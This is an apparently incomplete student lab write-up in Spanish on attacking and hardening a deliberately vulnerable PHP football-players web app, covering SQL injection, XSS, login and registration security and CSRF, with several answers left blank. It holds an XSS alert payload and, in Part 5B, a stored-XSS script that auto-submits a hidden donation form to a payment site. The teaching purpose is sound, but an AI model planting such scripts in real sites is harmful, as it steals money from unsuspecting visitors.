# Parte 1 - SQLi

**A) Dad un ejemplo de combinación de usuario y contraseña que provoque un error en la consulta SQL generada por este formulario. Apartir del mensaje de error obtenido, decid cuál es la consulta SQL que se ejecuta, cuál de los campos introducidos al formulario utiliza y cuál no.**

    ![FALTA]()

**B) Gracias a la SQL Injection del apartado anterior, sabemos que este formulario es vulnerable y conocemos el nombre de los campos de la tabla “users”. Para tratar de impersonar a un usuario, nos hemos descargado un diccionario que contiene algunas de las contraseñas más utilizadas (se listan a continuación):**

**- password**

**- 123456**

**- 12345678**

**- 1234**

**- qwerty**

**- 12345678**

**- dragon**

**Dad un ataque que, utilizando este diccionario, nos permita impersonar un usuario de esta aplicación y acceder en nombre suyo. Tened en cuenta que no sabéis ni cuántos usuarios hay registrados en la aplicación, ni los nombres de estos.**

    ![FALTA]()

**C) Si vais a `private/auth.php`, veréis que en la función `areUserAndPasswordValid`, se utiliza “SQLite3::escapeString()”, pero, aun así, el formulario es vulnerable a SQL Injections, explicad cuál es el error de programación de esta función y como lo podéis corregir.**

    **Explicación del error:**

    En el código original, la consulta SQL se construye concatenando directamente los valores del usuario (`$user`) en la consulta:

    ```php
    $query = SQLite3::escapeString('SELECT userId, password FROM users WHERE username = "' . $user . '"');
    ```

    Aunque se utiliza `SQLite3::escapeString()`, este método no es completamente seguro para prevenir ataques de inyección SQL. Un atacante podría intentar manipular la entrada para ejecutar consultas SQL maliciosas que comprometan la base de datos, lo que constituye una vulnerabilidad de **SQL Injection**.

    **Solución:**

    Para solucionar este problema, la consulta SQL debe construirse utilizando sentencias preparadas con parámetros. Las sentencias preparadas separan la consulta SQL de los datos proporcionados por el usuario, evitando así las inyecciones SQL.

    Cambiar la línea de código original:

    ```php
    $query = SQLite3::escapeString('SELECT userId, password FROM users WHERE username = "' . $user . '"');
    ```

    Debe ser reemplazada por el siguiente código usando una sentencia preparada:

    ```php
    $stmt = $db->prepare('SELECT userId, password FROM users WHERE username = :user');
    $stmt->bindValue(':user', $user, SQLITE3_TEXT);
    $result = $stmt->execute();
    ```

**D) Si habéis tenido éxito con el apartado b), os habéis autenticado utilizando el usuario `luis` (si no habéis tenido éxito, podéis utilizar la contraseña 1234 para realizar este apartado). Con el objetivo de mejorar la imagen de la jugadora Candela Pacheco, le queremos escribir un buen puñado de comentarios positivos, pero no los queremos hacer todos con la misma cuenta de usuario.**

**Para hacer esto, en primer lugar habéis hecho un ataque de fuerza bruta sobre eldirectorio del servidor web (por ejemplo, probando nombres de archivo) y habéis encontrado el archivo `add\_comment.php~`. Estos archivos seguramente se han creado como copia de seguridad al modificar el archivo “.php” original directamente al servidor. En general, los servidores web no interpretan (ejecuten) los archivos `.php~` sino que los muestran como archivos de texto sin interpretar.**

**Esto os permite estudiar el código fuente de `add\_comment.php` y encontrar una vulnerabilidad para publicar mensajes en nombre de otros usuarios. ¿Cuál es esta vulnerabilidad, y cómo es el ataque que utilizáis para explotarla?**

    ![FALTA]()

<br><br><br>

# Parte 2 - XSS

### **A) Para ver si hay un problema de XSS, crearemos un comentario que muestre un alert de Javascript siempre que alguien consulte el/los comentarios de aquel jugador (show_comments php). Dad un mensaje que genere un «alert»de Javascript al consultar el listado de mensajes.**

    **(Identifica y demuestra un ataque XSS funcional, explicando el impacto del alert.)**

    Introduzco el mensaje `<script>alert('XSS detectado');</script>`

    En el formulario de la página `show_comments.php`

### **B) Por qué dice `&amp;` cuando miráis un link (como el que aparece a la portada de esta aplicación pidiendo que realices un donativo) con parámetros GET dentro de código html si en realidad el link es sólo con "&" ?**

    **(Explica detalladamente el uso de entidades HTML en links y su impacto en seguridad.)**

    Explicación:

    El carácter `&amp;` es la forma codificada del carácter & en HTML. Esto sucede porque en el código fuente de la página, el carácter & está correctamente escapado como `&amp;`. La razón para esto es prevenir errores en el análisis del HTML o posibles vulnerabilidades en el navegador.

### **C) Explicad cuál es el problema de `show\_comments.php`, y cómo lo arreglaríais. Para resolver este apartado, podéis mirar el código fuente de esta página.**

    **Cual es el problema**
    
    El código no realiza ningún tipo de validación o sanitización de los datos recuperados de la base de datos (en este caso, los comentarios) antes de mostrarlos en la página. Específicamente:

    ```php
    echo "<div>
            <h4> ". $row['username'] ."</h4> 
            <p>commented: " . $row['body'] . "</p>
        </div>";
    ```

    El contenido de `$row['username']` y `$row['body']` proviene directamente de la base de datos y se inserta en el HTML sin procesarlo. Si un usuario malintencionado ha añadido un comentario que contiene código JavaScript (por ejemplo, `<script>alert('XSS');</script>`), este será ejecutado en el navegador de cualquier persona que visite la página.

    **Cómo arreglar el problema**

    1. **Sanitizar la salida con `htmlspecialchars`**
    - Antes de imprimir cualquier dato, escapa los caracteres especiales usando la función `htmlspecialchars` para evitar la ejecución de código JavaScript malicioso.
    - Modifica el bloque de código problemático de esta manera: (L-37/41)
        ```php
        echo "<div>
                <h4> ". htmlspecialchars($row['username'], ENT_QUOTES, 'UTF-8') ."</h4> 
                <p>commented: " . htmlspecialchars($row['body'], ENT_QUOTES, 'UTF-8') . "</p>
            </div>";
        ```

    2. **Implementar una Política de Seguridad de Contenidos (CSP)**
    - Añade encabezados HTTP que limiten la ejecución de scripts no autorizados en la página:
        ```php
        header("Content-Security-Policy: script-src 'self';");
        ```

### **D) Descubrid si hay alguna otra página que esté afectada por esta misma vulnerabilidad. En caso positivo, explicad cómo lo habéis descubierto.**

    ![FALTA]()

<br><br><br>

# Parte 3 - Control de acceso, autenticación y sesiones de usuarios

### **A) En el ejercicio 1, hemos visto cómo era inseguro el acceso de los usuarios a la aplicación. En la página de `register.php` tenemos el registro de usuario. ¿Qué medidas debemos implementar para evitar que el registro sea inseguro? Justifica esas medidas e implementa las medidas que sean factibles en este proyecto.**

    1. Línea 4-5: Se ha reemplazado el acceso directo a $_POST por filter_input() para sanitizar la entrada del usuario y trim() para eliminar espacios en blanco.
    ```php
    $username = trim(filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING));
    $password = password_hash($_POST['password'], PASSWORD_DEFAULT);
    ```

    2. Línea 7-9: Se ha añadido una verificación para asegurarse de que los campos no estén vacíos.
    ```php
    if (!empty($username) && !empty($password)) {
    ```

    3. Línea 10-13: Se ha reemplazado la inserción directa de SQL por una consulta preparada para prevenir inyecciones SQL.
    ```php
    $query = "INSERT INTO users (username, password) VALUES (:username, :password)";
    $stmt = $db->prepare($query);
    $stmt->bindParam(':username', $username, SQLITE3_TEXT);
    $stmt->bindParam(':password', $password, SQLITE3_TEXT);
    ```

    4. Línea 15-21: Se ha añadido manejo de errores y redirección segura.
    ```php
    if ($stmt->execute()) {
        header("Location: list_players.php");
        exit();
    } else {
        $error = "Error al registrar el usuario.";
    }
    ```

    5. Línea 36-38: Se ha añadido un mensaje de error en caso de que ocurra algún problema durante el registro.
    ```php
    <?php if (isset($error)): ?>
        <p style="color: red;"><?php echo htmlspecialchars($error); ?></p>
    <?php endif; ?>
    ```

    6. Línea 39: Se ha añadido htmlspecialchars() a la acción del formulario para prevenir XSS.
    ```php
    <form action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" method="post">
    ```

    7. Línea 40-43: Se han añadido atributos id y required a los campos de entrada para mejorar la accesibilidad y la validación del lado del cliente.
    ```php
    <input type="text" id="username" name="username" required>
    <input type="password" id="password" name="password" required>
    ```

    8. Línea 55: Se ha añadido un atributo alt a la imagen del logo para mejorar la accesibilidad.
    ```php
    <img src="images/logo-iesra-cadiz-color-blanco.png" alt="Logo">
    ```

### **B) En el apartado de login de la aplicación, también deberíamos implantar una serie de medidas para que sea seguro el acceso, (sin contar la del ejercicio 1.c). Como en el ejercicio anterior, justifica esas medidas e implementa las que sean factibles y necesarias (ten en cuenta las acciones realizadas en el register). Puedes mirar en la carpeta `private`**

    1. Línea 4: Se ha añadido el uso de sesiones en lugar de cookies para manejar la autenticación de forma más segura.
        ```php
        session_start();
        ```

    2. Líneas 11-14: Se ha reemplazado la consulta SQL directa por una consulta preparada para prevenir inyecciones SQL.
    ```php
    $query = "SELECT userId, password FROM users WHERE username = :username";
    $stmt = $db->prepare($query);
    $stmt->bindParam(':username', $user, SQLITE3_TEXT);
    $result = $stmt->execute();
    ```

    3. Línea 17-20: Se ha implementado la verificación segura de contraseñas usando password_verify() y se almacena el userId en la sesión.
    ```php
    if (password_verify($password, $row['password'])) {
        $userId = $row['userId'];
        $_SESSION['userId'] = $userId;
        return TRUE;
    }
    ```

    4. Línea 28: Se ha añadido sanitización de la entrada del usuario para el nombre de usuario.
    ```php
    $username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
    ```

    5. Líneas 31-34: Se ha mejorado el manejo de la autenticación exitosa, usando sesiones y redireccionando de forma segura.
    ```php
    if (areUserAndPasswordValid($username, $password)) {
        $_SESSION['user'] = $username;
        header("Location: index.php");
        exit();
    }
    ```

    6. Líneas 39-42: Se ha mejorado el proceso de cierre de sesión, destruyendo la sesión y redireccionando de forma segura.
    ```php
    if (isset($_POST['Logout'])) {
        session_destroy();
        header("Location: index.php");
        exit();
    }
    ```

    7. Línea 59: Se ha añadido escape de salida para prevenir XSS en los mensajes de error.
    ```php
    <?= htmlspecialchars($error) ?>
    ```

    8. Línea 66: Se ha añadido escape de salida en la acción del formulario para prevenir XSS.
    ```php
    <form action="<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>" method="post">
    ```

    9. Líneas 67-70: Se han añadido atributos id y required a los campos de entrada para mejorar la accesibilidad y la validación del lado del cliente.
    ```php
    <input type="text" id="username" name="username" required><br>
    <input type="password" id="password" name="password" required><br>
    ```

### **C) Volvemos a la página de `register.php`, vemos que está accesible para cualquier usuario, registrado o sin registrar. Al ser una aplicación en la cual no debería dejar a los usuarios registrarse, qué medidas podríamos tomar para poder gestionarlo e implementa las medidas que sean factibles en este proyecto.**

    1. Restringir el acceso solo a administradores:

    Podemos modificar el archivo register.php para verificar si el usuario actual tiene permisos de administrador antes de permitir el acceso. Aquí está cómo podríamos implementarlo:

    ```php
    <?php
    session_start();
    require_once dirname(__FILE__) . '/private/conf.php';

    // Verificar si el usuario está autenticado y es administrador
    if (!isset($_SESSION['user']) || !isAdmin($_SESSION['user'])) {
        header("Location: index.php");
        exit();
    }

    // Resto del código de register.php
    ```

    2. Implementar una función isAdmin() en conf.php:

    ```php
    function isAdmin($username) {
        global $db;
        $query = "SELECT is_admin FROM users WHERE username = :username";
        $stmt = $db->prepare($query);
        $stmt->bindParam(':username', $username, SQLITE3_TEXT);
        $result = $stmt->execute();
        $row = $result->fetchArray(SQLITE3_ASSOC);
        return isset($row['is_admin']) && $row['is_admin'] == 1;
    }
    ```

    3. Modificar la estructura de la base de datos:

    Añadir una columna 'is_admin' a la tabla 'users' para identificar a los administradores:

    ```sql
    ALTER TABLE users ADD COLUMN is_admin INTEGER DEFAULT 0;
    ```

    4. Crear una página de error personalizada:

    Crear un archivo error.php para redirigir a los usuarios no autorizados:

    ```php
    <!DOCTYPE html>
    <html lang="es">
    <head>
        <meta charset="UTF-8">
        <title>Acceso Denegado</title>
    </head>
    <body>
        <h1>Acceso Denegado</h1>
        <p>No tienes permiso para acceder a esta página.</p>
        <a href="index.php">Volver a la página principal</a>
    </body>
    </html>
    ```

    5. Actualizar la redirección en register.php:

    ```php
    if (!isset($_SESSION['user']) || !isAdmin($_SESSION['user'])) {
        header("Location: error.php");
        exit();
    }
    ```

### **D) Al comienzo de la práctica hemos supuesto que la carpeta `private` no tenemos acceso, pero realmente al configurar el sistema en nuestro equipo de forma local. ¿Se cumple esta condición? ¿Qué medidas podemos tomar para que esto no suceda?**

    **(Analiza completamente la situación e implementa medidas efectivas para proteger la carpeta private.)**

    La condición de que la carpeta `private` no sea accesible no se cumple en un entorno local por defecto.

    Para evitar este acceso no autorizado y mejorar la seguridad, se pueden tomar las siguientes medidas:

    1. Encriptación los archivos de la carpeta: 
    Los archivos que estan dentro de la carpeta `private` podrían estar encriptados. Solo se desencriptarían dentro del contenedor en tiempo de ejecución usando una clave. 
    
    El gran problema que tendria este metodo, es que la clave para desencriptar los archivos debe estar disponible en algún lugar para que el contenedor pueda funcionar correctamente, por lo que el usuario podria coger esa clave, y desencriptar los archivos.


    2. Uso de imágenes pre-construidas:
    En lugar de proporcionar los archivos fuente y el docker compose para levantar la web, podría proporcionar una imagen Docker ya construida, lo que dificultaría el acceso a los archivos internos. 

    Esto no es una solución completamente segura, aunque sí dificulta el acceso a los archivos internos en comparación con proporcionar los archivos fuente directamente.

### **E) Por último, comprobando el flujo de la sesión del usuario. Analiza si está bien asegurada la sesión del usuario y que no podemos suplantar a ningún usuario. Si no está bien asegurada, qué acciones podríamos realizar e implementarlas.**

    ![FALTA]()

<br><br><br>

# Parte 4 - Servidores web

### **¿Qué medidas de seguridad se implementariaís en el servidor web para reducir el riesgo a ataques?**

    ![FALTA]()

<br><br><br>

# Parte 5 - CSRF

### **A) Editad un jugador para conseguir que, en el listado de jugadores `list\_players.php` aparezca, debajo del nombre de su equipo y antes de `show/add comments` un botón llamado Profile que corresponda a un formulario que envíe a cualquiera que haga clic sobre este botón a esta dirección que hemos preparado.**

    ![FALTA]()

### **B) Una vez lo tenéis terminado, pensáis que la eficacia de este ataque aumentaría si no necesitara que elusuario pulse un botón. Con este objetivo, cread un comentario que sirva vuestros propósitos sin levantar ninguna sospecha entre los usuarios que consulten los comentarios sobre un jugador (`show\_comments.php`).**

    Añadimos un codigo malicios en los comentarios de los jugadores

    ```html
    <script>
        var form = document.createElement('form');
        form.method = 'GET';
        form.action = 'http://web.pagos/donate.php';
        
        var amountField = document.createElement('input');
        amountField.type = 'hidden';
        amountField.name = 'amount';
        amountField.value = '100';
        
        var receiverField = document.createElement('input');
        receiverField.type = 'hidden';
        receiverField.name = 'receiver';
        receiverField.value = 'attacker';
        
        form.appendChild(amountField);
        form.appendChild(receiverField);
        
        document.body.appendChild(form);
        form.submit();
    </script>
    ```
    Este código crea un formulario oculto con los parámetros necesarios (amount y receiver) y lo envía automáticamente al servidor de donaciones cuando el comentario es cargado.


### **C) Pero web.pagos sólo gestiona pagos y donaciones entre usuarios registrados, puesto que, evidentemente, le tiene que restar los 100€ a la cuenta de algún usuario para poder añadirlos a nuestra cuenta.**

### **Explicad qué condición se tendrá que cumplir por que se efectúen las donaciones de los usuarios que visualicen el mensaje del apartado anterior o hagan click en el botón del apartado a).**

    - Sesión activa: Si el sistema web.pagos requiere que los usuarios estén logueados para realizar cualquier tipo de transacción (como una donación), será necesario que el navegador del usuario ya tenga una cookie de sesión activa que permita autenticarlo. Esto es lo que permite identificar al usuario y asociarlo con su cuenta.

    - Transacción entre usuarios registrados: Al ser un sistema de pagos entre usuarios registrados, web.pagos utilizará la cookie de sesión o un token de autenticación para identificar a quien está haciendo la donación y deducir el dinero de su cuenta. Este es el paso clave: la transacción solo puede ocurrir si el usuario tiene una cuenta registrada y activa dentro de web.pagos.

    - Verificación de usuario: Si el usuario está logueado en la plataforma, el ataque será exitoso, ya que la donación se efectuará desde la cuenta del usuario víctima (que está visualizando el comentario o interactuando con el botón malicioso). Si el usuario no está logueado o no tiene una sesión activa, el ataque fallará, porque web.pagos no podrá deducir los 100€ de su cuenta.

### **D) Si web.pagos modifica la página `donate.php` para que reciba los parámetros a través de POST, quedaría blindada contra este tipo de ataques? En caso negativo, preparad un mensaje que realice un ataque equivalente al de la apartado b) enviando los parámetros “amount” i “receiver” por POST.**

    ![FALTA]()
